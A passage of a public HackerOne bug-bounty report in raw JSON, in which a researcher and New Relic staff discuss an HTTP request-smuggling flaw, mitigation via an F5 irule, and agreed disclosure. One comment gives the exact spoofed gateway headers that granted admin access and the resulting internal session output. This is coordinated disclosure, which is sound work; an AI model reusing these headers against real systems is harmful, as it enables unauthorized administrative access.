uyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b9995d4fa2d6db630d2ed5a2089af845ec4ec93e9462505c64865cbfe1ab076c"}],"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4193258,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @albinowax ,\n\nThat is correct, we have multiple services running with nginx behind our proxy. Our intended fix should remediate all of these.","automated_response":false,"created_at":"2019-02-22T16:40:43.725Z","updated_at":"2019-02-22T16:40:43.725Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4315814,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dday \n\nI mentioned briefly in the initial report that this technique could potentially be used to access internal services.  \n\nI've just done a bit of followup work on the staging servers and found that I can use the same technique to semi-directly hit the backend of alerts.newrelic.com with arbitrary requests. This means I can omit the `x-nr-external-service: external` service header, so the request will be trusted as though it came from the internal network. \n\nBy sending some extra headers I can then get full admin access to everything, on all accounts:\n```\nService-Gateway-User-Id: 934454\nService-Gateway-Account-Id: 934454\nService-Gateway-Is-Newrelic-Admin: true\n```\n\nHere's the output of hitting the `/internal_api/1/accounts/934454/session` endpoint. \n```\n{\"user\":{\"id\":934454,\"account_id\":934454,\"email\":null,\"is_newrelic_admin\":true,\"is_service_gateway_user\":true},\"current_account_id\":934454,\"features\":{\"RPM\":[\"find_metrics_by_cluster_agent_id\",\"host_count_hack\",\"host_usage_report\",\"mega_map_custom_entities\",\"mega_maps_drag_to_group\",\"metric_timeslice_service\",\"server_ng_index\",\"thrift_sql_trace_v2\",\"thrift_traced_error_v2\",\"thrift_transaction_trace_v2\",\"v5\",\"admin_user_api_keys\",\"use_rollups_for_application_breakdown\",\"metric_timeslice_service_serveza\",\"mobile_application_occurrence_api_access\",\"mobile_application_summary_api_access\",\"mobile_network_settings\",\"ng_mega_maps\",\"ng_mega_maps_externals_health\",\"hawthorne_api_access\",\"alerts_integration\",\"v2_ajax_segments\",\"agent_circuit_breaker\",\"angular_thread_profile\",\"api_internal_key\",\"bam_pro\",\"browser_billing\",\"configured_display_host\",\"datastores\",\"demo_another_flag\",\"apm_filterable_errors_nav\",\"seatbelt_for_highcharts\",\"be_feature_stack\",\"async_v1\",\"metric_explorer\",\"v2_geographies\",\"admin_user_api_key_allow_authentication\",\"aaa_deployed\",\"self_serve_p2b\",\"thread_profile_v2_collection\",\"pin_to_ducksboard_other_breakdown\",\"kt_metric_by_name_and_scope\",\"apm_filterable_errors\",\"json_session_serialization\",\"apm_expected_errors\",\"p2b_change_observer\",\"disable_time_to_get_paid\",\"thread_profile_v2\",\"limit_background_job_agents_to_time_window\",\"service_maps_default_mega_map\",\"admin_pages_product_associations\",\"admin_pages_product_groups\",\"admin_pages_product_labels\",\"admin_pages_product_retentions\",\"datastore_instances_poc\",\"admin_pages_system_configurations\",\"service_maps_charts\",\"admin_pages_products\",\"service_maps_fetch_gator\",\"admin_pages_metric_storage_policies\",\"admin_pages_failed_delayed_jobs\",\"admin_pages_backup_status\",\"admin_pages_beacon_specifications\",\"admin_pages_collector_specifications\",\"admin_pages_data_loggers\",\"admin_pages_shard_specifications\",\"mts_app_map\",\"apm_message_queues\",\"browser_overview_page\",\"essentials_self_serve\",\"admin_pages_banner_messages\",\"service_maps_override_megamap\",\"p2b_push_account_change\",\"mobile_http_requests_ga\",\"downgrade_prevention\",\"alerts_public_api_source\",\"jsErrors_sourcemaps\",\"netsuite_resque\",\"idle_session_timeout\",\"seymour_alpha\",\"p2b_handle_downgrade_revenue_change\",\"p2b_payment_type_enabled\",\"mtbls_self_serve\",\"jabberwocky\",\"deliver_legacy_alerts_email_with_retry\",\"p2b_deals_ui_disable_new_customer_bonus\",\"invoice_charging_job\",\"jsErrors_sourcemaps_queryservice\",\"p2b_pricing_hack\",\"p2b_subscription_change_endpoint_enabled\",\"mosaic_new_messages_ui\",\"promo_codes_self_serve\",\"infrastructure_deals_ui\",\"link_to_transaction_map_2017\",\"cross_account_pinning\",\"apm_suggest_infra_v2\",\"p2b_hide_inr_next_payment_date\",\"browser_overview_page_for_lite\",\"apm_infra_host_links\",\"service_maps_from_labels\",\"rbac_enable_user_management\",\"domainConditions\",\"app_map_legacy\",\"custom_views\",\"embeddable_charts\",\"browser_rbac\",\"pass_team_rbac\",\"browser_rbac_nav\",\"insights_pinning_modal\",\"apm_filterable_errors_unusual_attributes\",\"rbac_managed_addon_roles_enabled\",\"browser_app_reporting\",\"rbac_disable_old_ui\",\"deals_ui_zuora_order_entry\",\"process_incident_jobs\",\"rbac_capabilities_preview_enabled\",\"p2b_disable_customer_emails\",\"p2b_cancel_walking_dead_account\",\"rbac_roles_management_enabled\",\"wanda_responder\",\"apm_ui_rbac\",\"encrypt_integration_properties\",\"browserBrowsyn\",\"public_dashboard_api\",\"authorization_service_account_access_check_make_request\",\"p2b_payment_failed_email_copy_change\",\"zuora_subscription_preview_test\",\"p2b_disable_cancelled_email\",\"browser_overview_page_experiment\",\"apm_distributed_tracing\",\"apm_suggest_browser\",\"python_uninstrumented_banner\",\"display_non_zuora_payments\",\"service_maps_plugin_picker\",\"allow_regional_account_creation\",\"p2b_disable_invoice_editing\",\"show_insights_and_alerts_discover_button\",\"enable_environment_values_api\",\"p2b_disable_invoice_generation\",\"browser_start_trial\",\"partner_api_v2_infrastructure_response\",\"synthetics_billing\",\"hide_instance_performance_breakdown\",\"java_class_browser\",\"apm_metrics_daily_sync\",\"nsync_accounts_new\",\"apm_ui_app_settings\",\"nsync_user_change_observer\",\"use_correct_authorization_id\",\"service_map_datastores\",\"utc_to_pt\",\"mobile_error_profiler\",\"hawthorne_event_logging_agent_circuit_break\",\"custom_dashboards\",\"link_to_insights_transactions\",\"nsync_insights_new\",\"disable_saml_password_protected_transport\",\"preact_tracker\",\"new_due_payment_select\",\"reject_badly_encoded_requests\",\"use_agent_runs_for_oldest_agent_version\",\"disable_nsync_v2\",\"browser_self_serve\",\"nsync_synthetics_new\",\"p2b_credit_card_behavior\",\"browser_index_single_query\",\"api_v2_x_access_token_allow_authentication\",\"capture_params_security_fix\",\"customer_profile_cookie\",\"js_errors_v2\",\"self_serve_eu_hide_synthetics\",\"high_res_charts\",\"gtm_rbac\",\"apm_alerts_readiness\",\"marketo_sync_use_misnamed_api_name_for_fields\",\"nsync_user_daily_sync\",\"thread_analysis\",\"p2b_disable_netsuite_sync\",\"v2_ajax_requests\",\"infra_cu_autofill\",\"enable_p2d_payload_inspector\",\"database_real_agents_in_tw\",\"post_legacy_eol\",\"pin_to_ducksboard_app_percentile\",\"server_monitoring_mts\",\"health_status_include_target_product\",\"metric_timeslice_service_browser_ajax\",\"nsync_plugin_record_change_observer\",\"wan_type\",\"pin_to_ducksboard_solr_breakdown\",\"preload_incident_recent_events\",\"rescue_previous_next_payment_date\",\"timeslice_build_cluster_agent_map_via_active_record\",\"v2_js_errors\",\"vizco_charts_current_context\",\"insights_rbac\",\"tls_upgrade_allow_long_queries\",\"test_flag_enabled\",\"app_background_delete\",\"service_maps_from_transactions\",\"nsync_account_change_observer\",\"mega_maps_connection_ui\",\"mobile_metrics_salesforce_sync\",\"admin_pages_application_settings\",\"performance_host_presenter_related_apps\",\"enable_nsync_v3\",\"jira7_integration\",\"nsync_account_happiness_score_change_observer\",\"nsync_accounts_interim\",\"intercom_trial_support\",\"mosaic_ruby_vms\",\"disable_cc_rescues\",\"index_labels_scaling\",\"synthetics_in_product_switcher\",\"nsync_apm_new\",\"use_summary_record_service\",\"v2_session_trace_index\",\"hawthorne_event_logging\",\"revenue_change_fix\",\"quicksearch\",\"admin_pages_users\",\"insights_metrics_salesforce_sync\",\"thrift_tt\",\"other_key_transactions\",\"nsync_subscription_sync\",\"plugin_npi_extraction\",\"transaction_trace_duration_sort\",\"mobile_apps_api_v1_key_transactions\",\"legacy_salesforce_sync_insights\",\"browser_trial_timer\",\"nsync_mobile\",\"non_profit\",\"mega_map_browser_entities\",\"authorization_service_account_access_check_use_result\",\"key_transaction_maps\",\"apm_cu_autofill\",\"nsync_partnership_daily_sync\",\"nsync_account_view_change_observer\",\"api_preload_components\",\"summary_from_summary_service\",\"saml_raise_validation_exceptions\",\"nsync_browser_interim\",\"validate_subscription\",\"renewal_email_template_v2\",\"wordpress_hooks\",\"async_host_jvm_filter_dropdowns\",\"legacy_salesforce_sync_mobile\",\"show_hawthorne_api_endpoints_in_ui\",\"admin_pages_promotions\",\"status_lazy_selected_object_picker\",\"v5_email_templates\",\"nsync_insights_interim\",\"events_in_graphs\",\"drop_bogus_magento_deploy_markers\",\"session_vs_token_login_consistency_session_delete\",\"apm_suggest_infra\",\"nsync_mobile_interim\",\"daylight_savings_in_charts\",\"apm_filterable_errors_ux_v2_join_query\",\"api_v1_get_metric_data\",\"correct_apdex\",\"legacy_salesforce_sync_synthetics\",\"legacy_salesforce_sync_browser\",\"mobile_apps_api_browser\",\"nsync_trial_sync\",\"pin_to_dashboard\",\"mobile_apps_api_v1_applications\",\"apm_threads_metric_gating\",\"self_serve_p2b_secondary_payment\",\"non_us_date_format\",\"monthly_finance_reports_override\",\"nsync_browser\",\"rpm_site_rbac_enabled\",\"nsync_browser_new\",\"pin_to_ducksboard_other_overview\",\"metric_timeslice_service_browser_multi_value\",\"hawthorne_event_widget_time_clamp\",\"rescue_next_payment_date_sub_validation\",\"browser_metrics_daily_sync\",\"all_or_none_forgot_password_rate_limiter\",\"zendesk_family_support_priority\",\"faster_3_days\",\"thrift_sqltrace\",\"apm_threads\",\"infrastructure\",\"mobile_apps_api_v2_servers\",\"p2b_prevent_nr_employees_sync_to_netsuite\",\"rpm_login_consistency_fix\",\"static_competitor_list\",\"remove_lite_features\",\"apm_extended_trial_timer\",\"hide_grey_servers\",\"performance_servers_related_apps_for_all_hosts\",\"ampOverviewFeatureIsAccessible\",\"nsync_billing_info_change_observer\",\"admin_pages_invoices\",\"mobile_trial_timer\",\"gtm_staging\",\"insights_metrics_daily_sync\",\"cfp_cu_deploy_trial\",\"apm_trial_timer\",\"nsync_subscription_change_observer\",\"pin_to_ducksboard_app_overview\",\"baseline_api\",\"mobile_rbac\",\"session_vs_token_login_consistency\",\"nsync_agent_environment_attribute_change_observer\",\"ng_key_transactions\",\"usage_hours_sans_docker\",\"ng_mega_maps_timeslice_data\",\"mobile_apps_api_v2_key_transactions\",\"cdn_mega_maps\",\"nsync_insights\",\"hourly_account_charge_job_spawner\",\"p2b_billing_history\",\"mobile_crash_analysis_profiles\",\"zendesk_token_based_authentication\",\"nsync_account_view_daily_sync\",\"nsync_account_intel_change_observer\",\"nsync_send_deleted_at\",\"nsync_apm\",\"mosaic_go_runtime\",\"demo_feature_flag\",\"jira_oauth\",\"purge_expired_activity_traces_with_resque\",\"weekly_long_term_report_cal_fix\",\"p2b_disable_invoice_charge_job\",\"confirm_pager_duty_integration\",\"apm_deploy_video\",\"nsync_apm_interim\",\"infra_line_item_netsuit\",\"suppress_delta_billing\",\"mobile_apps_api_v1_servers\",\"dashboard_api_breaker_enabled\",\"check_for_recovery_alert_job_new_enqueue_path\",\"apm_ui_rbac_m3\",\"agent_summary_custom_event_logging\",\"apm_ui_migrate_app_settings_features\",\"js_errors_v2_sunset\",\"next_payment_date_line_item_end_date\",\"block_marketo_requests\",\"pin_to_custom_pages\",\"p2b_legacy_price_fix\",\"hawthorne_events_separate_fetch_violations\",\"aws_marketplace_notification_poller_job\",\"metric_timeslice_client_breaker_enabled\",\"thrift_traced_error\",\"connectivity_rbac\",\"cds_proxy\",\"nsync_revenue_change_observer\",\"nsync_synthetics\",\"host_agent_presenter_preload_infrastructure_agent\",\"service_maps_progressive_rendering\",\"mobile_apps_api_v2_applications\",\"app_index_problems_highlight\",\"js_errors_v3_ga\",\"p2b_disable_downgrade_delinquent_accounts\",\"purge_agents\",\"histogram_dirac_cache_priming\",\"apm_pricing_buy_now_experiment\",\"test_invoice_pdf\",\"component_api_threshold_fix\",\"nsync_mobile_new\",\"synthetics_metrics_salesforce_sync\",\"synthetics_metrics_daily_sync\",\"docker_monitoring\",\"trigger_account_sync_to_nsync\",\"apm_filterable_errors_ux_v2\",\"hawthorne_in_ui\",\"browser_tessen_timepicker\",\"nsync_account_product_level_change_observer\",\"account_charging_job\",\"admin_pages_accounts\",\"disable_marketo_sync\",\"rpm_aum_users\",\"jQueryMigrateWarningsToInsights\",\"advanced_account_management\",\"applications_alerts_tiers\",\"extrapolate_histograms\",\"filterable_crashes_access\",\"nsync_accounts\",\"mobile_metrics_daily_sync\",\"nsync_account_marketing_info_observer\",\"use_downtime_events_list_performance_improvement\",\"thrift_active_real_agents\",\"mosaic_node_vms_ui\",\"nsync_revenue_change_sync\",\"nsync_synthetics_interim\",\"enable_texas_tax\",\"trigger_verification_email_on_user_email_update\",\"p2b_disable_payment_failed_email\",\"hawthorne_remove_beta\",\"ui_summary_from_summary_service\",\"bam_ajax_by_method\",\"admin_pages_payments\",\"usage_report\",\"service_maps_welcome_screen_redesign\",\"api_v2_sorted_health_status\",\"show_overview_page_from_react_app\",\"apm_application_metadata_attributes\",\"mts_custom_event_logging\",\"wootric_nps_survey\",\"mobile_extended_trial_timer\",\"disable_activity_trace_purges\",\"browser_extended_trial_timer\",\"synthetics_self_serve\",\"has_min_apm_usage\",\"p2b_hide_zuora_invoices_before_november\",\"jQueryMigrateWarningsToConsole\",\"use_login_service_forgot_password\",\"agent_summary_service_client_breaker_enabled\",\"validate_summary_attributes\"],\"Hawthorne_AlertsUI\":[\"nrql_queries\",\"app_instance_conditions\",\"jvm_health_metrics\",\"rbac_enabled\",\"send_all_sg_headers\",\"nrql_bar\",\"nrql_baselines_enabled\",\"new_condition_edit_page\",\"incident_pagination\",\"auto_add_paid_accounts\",\"directional_baselines\",\"baseline_preview_extended_endpoint\",\"new_nrql_threshold_form\",\"nrql_query_api\",\"violation_traces\",\"remove_beta\",\"service_gateway_auth_enabled\",\"policy_export\",\"pga_conditions\",\"allow_multi_facet\",\"facets_enabled\"],\"Wanda\":[\"enable_ui\",\"has_cross_linking\",\"tags_public_api_enabled\",\"relationships_public_api_enabled\"]},\"treatments\":{\"alerting_ui_test\":\"off\"},\"entitlements\":{\"features\":{}},\"all_sg_headers\":{\"HTTP_SERVICE_GATEWAY_ACCOUNT_ID\":\"934454\",\"HTTP_SERVICE_GATEWAY_CONFIG\":\"alerts.newrelic.com\",\"HTTP_SERVICE_GATEWAY_FALLBACK_ACCOUNT_ID\":\"934454\",\"HTTP_SERVICE_GATEWAY_IS_NEWRELIC_ADMIN\":\"true\",\"HTTP_SERVICE_GATEWAY_USER_ID\":\"934454\"}}\n```\nI've also attached a screenshot showing a list of all routes.\n\nThe intended fix will still work fine, but hopefully this is sufficient to reclassify the severity.","automated_response":false,"created_at":"2019-03-13T12:07:47.197Z","updated_at":"2019-03-13T12:07:47.197Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":440683,"filename":"Screenshot_2019-03-13_at_10.37.57.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/683/1d2a503082d6c7ae438defab2520497b173f3324/Screenshot_2019-03-13_at_10.37.57.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-03-13_at_10.37.57.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-03-13_at_10.37.57.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150623Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ea46174245d3e7cd7e50259145fed66902a73e5d523b4666cffbfb71420b3fde"}],"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4331610,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @albinowax ,\n\nThanks for reaching out. As per our policy, we pretty explicitly reserve the `critical` severity for RCE. Additionally, we've already awarded a bonus for this. We appreciate your reports and really do hope you continue to throw these awesome bugs our way!","automated_response":false,"created_at":"2019-03-15T16:29:52.990Z","updated_at":"2019-03-15T16:29:52.990Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4331787,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fair enough, it was worth exploring anyhow.","automated_response":false,"created_at":"2019-03-15T17:00:46.210Z","updated_at":"2019-03-15T17:00:46.210Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4347830,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @albinowax ,\n\nJust so you're aware - this ended up being a bug with F5, which we've reported to them. I'll let you know as soon as we have a fix in place for you to try to reproduce.","automated_response":false,"created_at":"2019-03-18T17:35:48.545Z","updated_at":"2019-03-18T17:35:48.545Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4640878,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update. I should mention that I'm planning to publish extensive research on this attack class at a security conference in August. You can see the abstract here: https://www.blackhat.com/us-19/briefings/schedule/index.html#http-desync-attacks-smashing-into-the-cell-next-door-15153\n\nAfter the presentation it's quite likely that other people will notice this vulnerability. As such, I highly recommend ensuring this vulnerability is resolved beforehand. ","automated_response":false,"created_at":"2019-04-25T11:10:07.618Z","updated_at":"2019-04-25T11:10:07.618Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4643795,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @albinowax,\n\nWe're currently testing a mitigation for this issue and will slowly be rolling it out assuming we don't have any major issues. We should be in a good place before Black Hat, but the heads up is much appreciated.\n\nCongratulations on getting your talk accepted, I look forward to seeing it! We'll update you here as soon as we have more progress details to share.","automated_response":false,"created_at":"2019-04-25T18:49:53.981Z","updated_at":"2019-04-25T18:49:53.981Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5043440,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2019-06-10T17:53:54.821Z","updated_at":"2019-06-10T17:53:54.821Z","actor":{"username":"tgalloway","cleared":false,"url":"/tgalloway","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/612/974/4479560d844e2c7759ecb6c4915bd92e4ab8d698_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"albinowax","url":"/albinowax"},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5047859,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can I ask how this has been patched? I can't exploit it any more, but it still behaves suspiciously.","automated_response":false,"created_at":"2019-06-11T10:35:20.719Z","updated_at":"2019-06-11T10:35:20.719Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5049370,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @albinowax ,\n\nSure - As mentioned before, this ended up being a bug with F5. While the bug is being fixed, we implemented an irule solution until we are given a patch. Can you elaborate on the \"suspicious\" behavior?","automated_response":false,"created_at":"2019-06-11T13:52:08.600Z","updated_at":"2019-06-11T13:52:08.600Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5049717,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The suspicious behaviour is just certain ambiguous requests causing timeouts which suggests that the core vulnerability hasn't been patched. This makes sense given that you've used an irule hotfix and are still waiting on F5, so I don't think it's anything to worry about. Of course if you want to share the irule I'm happy to verify it.","automated_response":false,"created_at":"2019-06-11T14:45:48.144Z","updated_at":"2019-06-11T14:45:48.144Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5692112,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we disclose this? F5 has now issued a security advisory: https://support.f5.com/csp/article/K50375550","automated_response":false,"created_at":"2019-08-29T15:47:08.294Z","updated_at":"2019-08-29T15:47:08.294Z","first_to_agree":true,"actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5694861,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Absolutely! Thanks again for the excellent research and report.","automated_response":false,"created_at":"2019-08-30T01:06:43.548Z","updated_at":"2019-08-30T01:06:43.548Z","actor":{"username":"ahamlin","cleared":false,"url":"/ahamlin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5694862,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-08-30T01:06:43.661Z","updated_at":"2019-08-30T01:06:43.661Z","actor":{"username":"ahamlin","cleared":false,"url":"/ahamlin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":18067,"category":"researcher","content":"I've posted a writeup of this exploit and others using the same technique at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn\n\n**Warning**: Do not copy the Turbo Intruder attack script used in this report. Because `requestsPerConnection` is not set to 1, it can cause false positives on non-vulnerable targets","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":56414,"username":"albinowax","name":"James Kettle","bio":"@albinowax","cleared":true,"website":"https://skeletonscribe.net/","location":"United Kingdom","created_at":"2016-02-15T11:34:15.992Z","url":"https://hackerone.com/albinowax","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"hacker_resume_enabled":true,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}